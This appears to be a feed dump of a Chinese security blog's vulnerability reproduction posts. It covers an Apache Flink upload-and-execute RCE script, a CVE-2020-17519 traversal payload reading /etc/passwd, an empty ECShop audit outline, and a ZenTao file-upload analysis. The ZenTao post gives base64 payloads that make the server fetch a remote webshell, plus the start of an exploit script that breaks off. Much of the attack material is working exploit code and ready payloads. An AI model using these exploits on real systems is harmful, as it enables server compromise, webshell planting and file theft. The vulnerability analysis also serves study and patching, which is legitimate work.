jar_name)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.delete(url=url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">self, command</span>):</span></span><br><span class="line">        jar_file = self.jar_upload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            execute_cmd_url = <span class="string">&#x27;%s/jars/%s/run?entry-class=Execute&amp;program-args=&quot;%s&quot;&#x27;</span> % (self.url, jar_file, command)</span><br><span class="line">            res = requests.post(url=execute_cmd_url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            res = re.findall(<span class="string">&#x27;\|@\|(.*?)\|@\|&#x27;</span>, res.text)[<span class="number">0</span>][<span class="number">0</span>:<span class="number">-2</span>]</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                print(<span class="string">&#x27;rce command &quot;%s&quot; exec result: %s&#x27;</span> % (command, res))</span><br><span class="line">                state = <span class="number">1</span></span><br><span class="line">                msg = <span class="string">&#x27;%s rce success&#x27;</span> % self.url</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                state = <span class="number">0</span></span><br><span class="line">                msg = <span class="string">&#x27;%s rce failed&#x27;</span> % self.url</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            state = <span class="number">0</span></span><br><span class="line">            msg = <span class="string">&#x27;%s rce failed&#x27;</span> % self.url</span><br><span class="line"></span><br><span class="line">        delete = self.jar_delete</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;state&#x27;</span>: state, <span class="string">&#x27;version&#x27;</span>: self.get_version, <span class="string">&#x27;msg&#x27;</span>: msg&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    usage = <span class="string">&#x27;python3 script.py ip port command&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;simple usage: %s&#x27;</span> % usage)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        command = sys.argv[<span class="number">3</span>]</span><br><span class="line">        url = <span class="string">&#x27;http://%s:%s&#x27;</span> % (ip, port)</span><br><span class="line">        res = FlinkRCECheck(url=url).rce(command=command)</span><br><span class="line">        print(res)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p>原来是要<code>1.9.x</code> 版本的。这里的版本是1.11.x了。懂怎么用就行了。。老sb了。</p><h2 id="CVE-2020-17519-任意文件读取漏洞"><a href="#CVE-2020-17519-任意文件读取漏洞" class="headerlink" title="CVE-2020-17519 任意文件读取漏洞"></a>CVE-2020-17519 任意文件读取漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194915.png"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>亘古不变的升级到最新版。（x。那这还学个屁。跟着commi ，简单分析下不香？</p><p>对<code>../</code>进行了处理。希望不会像其他洞一样出现绕过的情况 :call_me_hand:</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118200807.png"></p><p>后面还对上传的文件大小、内容进行了一些判断，。代码太长了不想看。</p><p><strong>我分析错了。</strong>具体看看：</p><p><a href="https://www.anquanke.com/post/id/228507#h3-10">https://www.anquanke.com/post/id/228507#h3-10</a></p><p><a href="https://xz.aliyun.com/t/9023">https://xz.aliyun.com/t/9023</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4">https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4</a></p><p><a href="https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518">https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518</a></p><p><a href="https://www.anquanke.com/post/id/227630">https://www.anquanke.com/post/id/227630</a></p><p><a href="https://www.freebuf.com/vuls/260257.html">https://www.freebuf.com/vuls/260257.html</a></p><p><a href="https://www.exploit-db.com/exploits/48978">https://www.exploit-db.com/exploits/48978</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞背景&quot;&gt;&lt;a href=&quot;#漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;漏洞背景&quot;&gt;&lt;/a&gt;漏洞背景&lt;/h1&gt;&lt;p&gt;2021年01月06日，Apache Flink&lt;code&gt;发布了&lt;/code&gt;Apache Flink 目录穿越漏洞,目录</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>代码审计：ECshop V2.7.3 SQL注入&amp; RCE</title>
    <link href="https://hack-for.fun/3f72.html"/>
    <id>https://hack-for.fun/3f72.html</id>
    <published>2021-01-15T18:04:10.000Z</published>
    <updated>2021-01-17T01:33:39.137Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p>ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2018年6月13日，知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”防御拦截并捕获到一个针对某著名区块链交易所网站的攻击，通过分析，发现攻击者利用的正式ECShop 2.x版本的0day漏洞攻击。于2018年6月14日，提交到知道创宇Seebug漏洞平台并<a href="https://www.seebug.org/vuldb/ssvid-97343">收录</a>。</p><p>随后于2018年8月31日，ID为“ringk3y”研究人员在其博客公开这个<a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">漏洞</a>，并做了详细分析，该分析收录在<a href="https://paper.seebug.org/691/">Seebug Paper</a>。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>ECshop V2.7.3 源码下载地址：<a href="https://www.mycodes.net/44/819.htm">https://www.mycodes.net/44/819.htm</a></p><p>安装过程设置：数据库名称为ECshop、管理账号密码：admin、admin123</p><p>这里Mac环境搭不起这个cms，可能太久远了。Windows虚拟机上用phpstudy 搭建也不成。</p><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></p><p><a href="https://paper.seebug.org/695/">https://paper.seebug.org/695/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞背景&quot;&gt;&lt;a href=&quot;#漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;漏洞背景&quot;&gt;&lt;/a&gt;漏洞背景&lt;/h1&gt;&lt;p&gt;ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计：CNVD-C-2020-121325：禅道后台文件上传漏洞</title>
    <link href="https://hack-for.fun/c5f5.html"/>
    <id>https://hack-for.fun/c5f5.html</id>
    <published>2021-01-15T03:31:29.000Z</published>
    <updated>2021-01-16T06:02:35.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p>禅道是第一款国产的开源项目管理软件，其使用zentaophp框架开发，内置了测试管理、计划管理、发布管理、文档管理、事务管理等产品管理和项目管理功能，并为每一个页面提供json接口的api，方便与其它语言调用交互。内置多语言、多风格、搜索功能、统计功能等多种实用功能。</p><p>2020年10月14日，禅道官网发布安全公告，禅道开源项目管理软件中存在一个文件上传漏洞（CNVD-C-2020-121325）。<strong>攻击者可以通过fopen/fread/fwrite方法结合File、FTP等协议读取或上传任意文件。成功利用此漏洞的攻击者可获得目标系统敏感文件及系统管理权限。</strong></p><p>影响版本：</p><ul><li>禅道开源版12.3.3、12.4.1、12.4.2</li><li>禅道:禅道开源版&lt;=12.4.2</li></ul><blockquote><p>漏洞只适用于Windows一键安装版（未加安全限制）、Linux一键安装版（未加安全限制）、安装包版。Windows/Linux一键安装版(加入安全限制)由于做过新上传文件限制，无法执行上传后的文件，导致漏洞无法利用。</p></blockquote><p>利用条件：需要后台权限</p><p>禅道开源版12.4.2下载地址：<a href="https://www.zentao.net/download/zentaopms12.4.2-80263.html">https://www.zentao.net/download/zentaopms12.4.2-80263.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;www.zentao.net&#x2F;dl&#x2F;zentao&#x2F;12.4.2&#x2F;ZenTaoPMS.12.4.2.zip</span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>环境：</p><p>OS：MacOS</p><p>PHP：5.4.45</p><p>MySQL：5.7.26</p><p>将下载好的源码，放到MAMP PRO的hosts的Document目录即可启动环境。</p><p>访问 <a href="http://zentaopms:8890/www/install.php">http://zentaopms:8890/www/install.php</a> 即可安装禅道</p><p>安装完成后，设置账号密码为弱口令，禅道的安全策略会让用户强制改密码(我改为了Admin@123)，这一点很不错。因为这个漏洞发生在后台，如果没办法进后台，就没办法利用。</p><p>其他都默认即可。</p><h2 id="利用方法一"><a href="#利用方法一" class="headerlink" title="利用方法一"></a>利用方法一</h2><p>12.4.2 和 12.4.3 代码对比：</p><p><code>module/client/ext/model/xuanxuan.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000837.png"></p><p>新增代码如下：即对文件名的扩展名进行了校验。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file      = basename($link);</span><br><span class="line">$extension = substr($file, strrpos($file, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;allowed&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>正常情况下，获取文件名后缀，可以看到，如果是非法后缀，都直接返回<code>txt</code></p><p><code>/module/file/model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get extension of a file.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string    $filename</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getExtension</span>(<span class="params">$filename</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $extension = trim(strtolower(pathinfo($filename, PATHINFO_EXTENSION)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension) <span class="keyword">or</span> stripos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;dangers&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) !== <span class="literal">false</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension) <span class="keyword">or</span> stripos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;allowed&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>($extension == <span class="string">&#x27;php&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> $extension;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进父类<code>downloadZipPackage</code> 方法</p><p><code>/module/client/model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Download zip package.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $version</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $link</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool | string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadZipPackage</span>(<span class="params">$version, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($version) || <span class="keyword">empty</span>($link)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    $dir  = <span class="string">&quot;data/client/&quot;</span> . $version . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    $link = helper::safe64Decode($link);</span><br><span class="line">    $file = basename($link);</span><br><span class="line">    <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir))</span><br><span class="line">    &#123;</span><br><span class="line">        mkdir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir . $file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> commonModel::getSysURL() . <span class="keyword">$this</span>-&gt;config-&gt;webRoot . $dir . $file;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_clean();</span><br><span class="line">    ob_end_flush();</span><br><span class="line"></span><br><span class="line">    $local  = fopen(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir . $file, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    $remote = fopen($link, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>($remote === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof($remote))</span><br><span class="line">    &#123;</span><br><span class="line">        $buffer = fread($remote, <span class="number">4096</span>);</span><br><span class="line">        fwrite($local, $buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($local);</span><br><span class="line">    fclose($remote);</span><br><span class="line">    <span class="keyword">return</span> commonModel::getSysURL() . <span class="keyword">$this</span>-&gt;config-&gt;webRoot . $dir . $file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>downloadZipPackage</code> 方法，获取两个参数，<code>version</code> 和 <code>link</code> ，将第一个参数作为路径中的一部分进行拼接（<code>data/client/ . $version . &#39;/&#39;</code>），第二个参数通过调用<code>safe64Decode</code>方法进行base64解码</p><p><code>/framework/base/helper.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">safe64Decode</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_decode(strtr($string, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法同时去除字符串中的<code>.</code> 和<code>/</code> 来避免<code>目录穿越漏洞</code></p><p>最后用<code>fopen</code> 函数打开远程或本地的文件呢。</p><p>在<code>module/client/ext/model/xuanxuan.php</code> 中，（漏洞函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadZipPackage</span>(<span class="params">$version, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $decodeLink = helper::safe64Decode($link);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^https?\:\/\//&#x27;</span>, $decodeLink)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::downloadZipPackage($version, $link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法获取两个参数，然后对<code>link</code>参数进行<code>safe64Decode</code>，再判断是否为<code>https/http</code> 协议，如果不是就返回<code>false</code>，注意到这里并没有用<code>/i</code>模式进行匹配，忽略大小写。(<strong>故此处存在大小写bypass</strong>)如果满足if语句，就调用父类的<code>downloadZipPackage</code>方法，下载<code>zip</code>包进行更新。</p><p>在<code>/moudle/client/control.php</code>中的<code>download</code>方法调用了<code>downloadZipPackage</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Download remote package.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $version</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $link</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $os</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params">$version = <span class="string">&#x27;&#x27;</span>, $link = <span class="string">&#x27;&#x27;</span>, $os = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;client-&gt;downloadZipPackage($version, $link);</span><br><span class="line">    <span class="keyword">if</span>($result == <span class="literal">false</span>) <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;client-&gt;downloadFail));</span><br><span class="line">    $client = <span class="keyword">$this</span>-&gt;client-&gt;edit($version, $result, $os);</span><br><span class="line">    <span class="keyword">if</span>($client == <span class="literal">false</span>) <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;client-&gt;saveClientError));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;client&#x27;</span> =&gt; $client, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;saveSuccess, <span class="string">&#x27;locate&#x27;</span> =&gt; inlink(<span class="string">&#x27;browse&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们去找一下下载文件的入口点。对禅道的路由解析分析</p><p><code>/framework/base/router.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置路由(GET 方式)：</span></span><br><span class="line"><span class="comment">     * 1.设置模块名；</span></span><br><span class="line"><span class="comment">     * 2.设置方法名；</span></span><br><span class="line"><span class="comment">     * 3.设置控制器文件。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Set the route according to GET.</span></span><br><span class="line"><span class="comment">     * 1. set the module name.</span></span><br><span class="line"><span class="comment">     * 2. set the method name.</span></span><br><span class="line"><span class="comment">     * 3. set the control file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setRouteByGET</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $moduleName = <span class="keyword">isset</span>($_GET[<span class="keyword">$this</span>-&gt;config-&gt;moduleVar]) ? strtolower($_GET[<span class="keyword">$this</span>-&gt;config-&gt;moduleVar]) : <span class="keyword">$this</span>-&gt;config-&gt;default-&gt;module;</span><br><span class="line">        $methodName = <span class="keyword">isset</span>($_GET[<span class="keyword">$this</span>-&gt;config-&gt;methodVar]) ? strtolower($_GET[<span class="keyword">$this</span>-&gt;config-&gt;methodVar]) : <span class="keyword">$this</span>-&gt;config-&gt;default-&gt;method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setModuleName($moduleName);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setMethodName($methodName);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setControlFile();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>以及<code>setFlowURI</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000856.png"></p><p>从注释中可以知道，如果为<code>download</code>那么下载的URI则为：</p><p><code>$module-download-1.html</code></p><p>于是构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;zentaopms:8890&#x2F;www&#x2F;client-download-1-SFRUUDovLzE5Mi4xNjguMjI2LjEyOS9waHBpbmZvLnBocA&#x3D;&#x3D;-1.html</span><br></pre></td></tr></table></figure><p>这里我本地环境不知道为什么原因，上传成功后不像网上的文章能够直接得到回显。我就一直认为是没有复现成功。</p><p>结果在目录下是上传成功了的。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000921.png"></p><p>访问WebShell：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000951.png"></p><p>所以通过代码层面理解了漏洞原理之后，没有回显出地址也一样GetShell，问题不大。</p><h2 id="利用方法二"><a href="#利用方法二" class="headerlink" title="利用方法二"></a>利用方法二</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;233&amp;link&#x3D;SFRUUDovLzE5Mi4xNjguMjI2LjEyOS9waHBpbmZvLnBocA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>利用方法二和方法一的区别就是路由。禅道的两种路由解析方式。</p><p>这里看这位师傅的分析文章：</p><p><a href="https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>分析完之后，一句话总结漏洞原理。</p><blockquote><p>源码未对远程下载的文件进行拓展名合法性校验，if判断大写绕过，并且上传之后的文件名路径已知，导致GetShell。</p></blockquote><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">usage = <span class="string">&quot;&quot;&quot;Usage example:</span></span><br><span class="line"><span class="string">python3  CNVD-C-2020-121325.py -t http://www.target.com -p 1 -rs remoteshell -m 1</span></span><br><span class="line"><span class="string">result maybe: http://www.target.com/www/data/client/1/phpinfo.php</span></span><br><span class="line"><span class="string">author: m0nk3y</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">2</span>]</span><br><span class="line">version = sys.argv[<span class="number">4</span>]</span><br><span class="line">remoteshell = sys.argv[<span class="number">6</span>]  <span class="comment"># your remote shell uri in base64encode format</span></span><br><span class="line">mode = sys.argv[<span class="number">8</span>]</span><br><span class="line">payload1 = <span 